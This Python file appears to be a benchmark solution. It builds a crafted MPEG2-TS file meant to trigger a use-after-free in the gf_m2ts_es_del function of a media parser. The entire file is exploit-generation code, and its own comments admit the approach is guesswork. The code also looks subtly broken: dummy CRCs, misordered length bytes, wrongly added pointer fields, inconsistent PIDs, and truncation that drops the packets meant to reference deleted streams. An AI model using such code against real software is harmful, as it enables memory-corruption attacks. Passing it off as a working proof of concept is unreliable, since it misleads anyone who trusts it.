import os
import tempfile
import subprocess
import shutil
import struct
import hashlib
import random
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the source
            shutil.unpack_archive(src_path, tmpdir)
            
            # Find the extracted directory
            extracted_dirs = list(Path(tmpdir).iterdir())
            if not extracted_dirs:
                raise ValueError("Failed to extract source tarball")
            source_dir = extracted_dirs[0]
            
            # Generate a PoC that triggers the use-after-free in gf_m2ts_es_del
            # Based on typical heap use-after-free patterns in MPEG2-TS parsers
            poc = self._generate_m2ts_poc()
            
            return poc
    
    def _generate_m2ts_poc(self) -> bytes:
        """
        Generate an MPEG2-TS file that triggers use-after-free in gf_m2ts_es_del.
        The vulnerability likely involves improper cleanup of elementary stream
        descriptors or timing between stream deletion and access.
        """
        # Create a minimal valid MPEG2-TS structure
        poc = bytearray()
        
        # MPEG2-TS packets are 188 bytes each
        # We'll create a structure that:
        # 1. Creates multiple elementary streams
        # 2. Deletes them in a specific order
        # 3. Accesses freed memory through dangling pointers
        
        # Create Program Association Table (PAT)
        pat_packet = self._create_pat_packet()
        poc.extend(pat_packet)
        
        # Create Program Map Table (PMT)
        pmt_packet = self._create_pmt_packet()
        poc.extend(pmt_packet)
        
        # Create multiple elementary streams to trigger complex cleanup
        for i in range(8):
            # Create PES packets with different stream IDs
            pes_packet = self._create_pes_packet(
                stream_id=0xE0 + i,  # Video stream IDs
                pts=90000 * i,
                data=b'\x00' * 160  # Fill with dummy data
            )
            ts_packets = self._pes_to_ts_packets(pes_packet, pid=0x100 + i)
            poc.extend(ts_packets)
        
        # Create discontinuity to trigger cleanup
        # This might cause premature deletion
        pat_packet2 = self._create_pat_packet(version=1)
        poc.extend(pat_packet2)
        
        # Create PMT with different PIDs to confuse the parser
        pmt_packet2 = self._create_pmt_packet(version=1, pcr_pid=0x1FF)
        poc.extend(pmt_packet2)
        
        # Create packets that reference deleted streams
        # This is where the use-after-free occurs
        for i in range(4):
            # Reference stream that was just deleted
            pes_packet = self._create_pes_packet(
                stream_id=0xE0 + (i % 2),  # Alternate between deleted streams
                pts=90000 * (10 + i),
                data=b'\xFF' * 172  # Different pattern to trigger different code paths
            )
            ts_packets = self._pes_to_ts_packets(
                pes_packet, 
                pid=0x100 + (i % 2),  # Use PIDs of deleted streams
                continuity_counter=(i + 5) % 16
            )
            poc.extend(ts_packets)
        
        # Add null packets to pad to target size
        remaining = 1128 - len(poc)
        if remaining > 0:
            # Add null packets (PID 0x1FFF)
            null_packets_needed = (remaining + 187) // 188
            for _ in range(null_packets_needed):
                null_packet = self._create_null_packet()
                poc.extend(null_packet)
        
        # Trim to exact target length
        poc = poc[:1128]
        
        # Ensure we have exactly 1128 bytes as specified
        if len(poc) < 1128:
            poc.extend(b'\x47' * (1128 - len(poc)))
        
        return bytes(poc)
    
    def _create_pat_packet(self, version=0):
        """Create Program Association Table packet."""
        packet = bytearray(188)
        
        # Sync byte
        packet[0] = 0x47
        
        # PID 0x0000 (PAT)
        packet[1] = 0x40  # payload unit start indicator
        packet[2] = 0x00  # PID high
        packet[3] = 0x00  # PID low
        
        # Continuity counter
        packet[3] |= 0x00
        
        # Adaptation field control (payload only)
        packet[3] |= 0x10
        
        # PAT data starts at byte 4
        # Pointer field
        packet[4] = 0x00
        
        # PAT section
        packet[5] = 0x00  # table_id
        packet[6] = 0xB0  # section_syntax_indicator + reserved
        packet[7] = 0x0D  # section_length low
        packet[8] = 0x00  # section_length high
        packet[9] = 0x00  # transport_stream_id
        packet[10] = 0x01
        packet[11] = 0xC1 | (version << 1)  # version, current_next_indicator
        packet[12] = 0x00  # section_number
        packet[13] = 0x00  # last_section_number
        
        # Program 1 -> PMT PID 0x0100
        packet[14] = 0x00
        packet[15] = 0x01
        packet[16] = 0xE1  # PMT PID high
        packet[17] = 0x00  # PMT PID low
        
        # CRC (dummy)
        packet[18] = 0x00
        packet[19] = 0x00
        packet[20] = 0x00
        packet[21] = 0x00
        
        return packet
    
    def _create_pmt_packet(self, version=0, pcr_pid=0x0100):
        """Create Program Map Table packet."""
        packet = bytearray(188)
        
        # Sync byte
        packet[0] = 0x47
        
        # PID 0x0100 (PMT)
        packet[1] = 0x40  # payload unit start indicator
        packet[2] = 0x01  # PID high
        packet[3] = 0x00  # PID low
        
        # Continuity counter
        packet[3] |= 0x01
        
        # Adaptation field control (payload only)
        packet[3] |= 0x10
        
        # Pointer field
        packet[4] = 0x00
        
        # PMT section
        packet[5] = 0x02  # table_id
        packet[6] = 0xB0  # section_syntax_indicator + reserved
        packet[7] = 0x11  # section_length low
        packet[8] = 0x00  # section_length high
        packet[9] = 0x00  # program_number
        packet[10] = 0x01
        packet[11] = 0xC1 | (version << 1)  # version, current_next_indicator
        packet[12] = 0x00  # section_number
        packet[13] = 0x00  # last_section_number
        
        # PCR_PID
        packet[14] = (pcr_pid >> 8) & 0x1F
        packet[15] = pcr_pid & 0xFF
        
        # Program info length
        packet[16] = 0xF0
        packet[17] = 0x00
        
        # Stream type (H.264)
        packet[18] = 0x1B
        
        # Elementary PID (video)
        packet[19] = 0xE1
        packet[20] = 0x00
        
        # ES info length
        packet[21] = 0xF0
        packet[22] = 0x00
        
        # Stream type (audio)
        packet[23] = 0x0F
        
        # Elementary PID (audio)
        packet[24] = 0xC0
        packet[25] = 0x00
        
        # ES info length
        packet[26] = 0xF0
        packet[27] = 0x00
        
        # CRC (dummy)
        packet[28] = 0x00
        packet[29] = 0x00
        packet[30] = 0x00
        packet[31] = 0x00
        
        return packet
    
    def _create_pes_packet(self, stream_id, pts, data):
        """Create a PES packet."""
        packet = bytearray()
        
        # PES header
        packet.extend(b'\x00\x00\x01')  # Start code prefix
        packet.append(stream_id)  # Stream ID
        
        # PES packet length (will be filled later)
        packet_length_pos = len(packet)
        packet.extend(b'\x00\x00')
        
        # PES header flags
        packet.extend(b'\x80')  # '10' + PES scrambling control + priority
        
        # PTS only
        packet.append(0x80 | ((pts >> 29) & 0x0E))
        
        # PTS
        packet.append((pts >> 22) & 0xFF)
        packet.append(((pts >> 14) & 0xFE) | 0x01)
        packet.append((pts >> 7) & 0xFF)
        packet.append(((pts << 1) & 0xFE) | 0x01)
        
        # Add data
        packet.extend(data)
        
        # Update PES packet length
        pes_length = len(packet) - 6  # Excluding start code and length field
        packet[packet_length_pos] = (pes_length >> 8) & 0xFF
        packet[packet_length_pos + 1] = pes_length & 0xFF
        
        return packet
    
    def _pes_to_ts_packets(self, pes_packet, pid, continuity_counter=0):
        """Split PES packet into TS packets."""
        packets = bytearray()
        
        # Calculate how many TS packets we need
        pes_offset = 0
        pes_length = len(pes_packet)
        
        while pes_offset < pes_length:
            packet = bytearray(188)
            
            # Sync byte
            packet[0] = 0x47
            
            # PID
            packet[1] = 0x40 if pes_offset == 0 else 0x00  # payload unit start indicator
            packet[1] |= (pid >> 8) & 0x1F
            packet[2] = pid & 0xFF
            
            # Adaptation field control and continuity counter
            packet[3] = 0x10  # payload only, no adaptation field
            packet[3] |= continuity_counter & 0x0F
            
            # Calculate available payload space
            header_size = 4
            available = 188 - header_size
            
            # If this is the first packet, we need a pointer field
            if pes_offset == 0:
                packet[4] = 0x00  # pointer field
                available -= 1
            
            # Copy data
            copy_len = min(available, pes_length - pes_offset)
            dst_offset = header_size
            if pes_offset == 0:
                dst_offset += 1
            
            packet[dst_offset:dst_offset + copy_len] = \
                pes_packet[pes_offset:pes_offset + copy_len]
            
            packets.extend(packet)
            pes_offset += copy_len
            continuity_counter = (continuity_counter + 1) & 0x0F
        
        return packets
    
    def _create_null_packet(self):
        """Create a null packet (PID 0x1FFF)."""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0x1F  # PID high
        packet[2] = 0xFF  # PID low
        packet[3] = 0x10  # Adaptation field control
        
        # Fill with 0xFF
        for i in range(4, 188):
            packet[i] = 0xFF
        
        return packet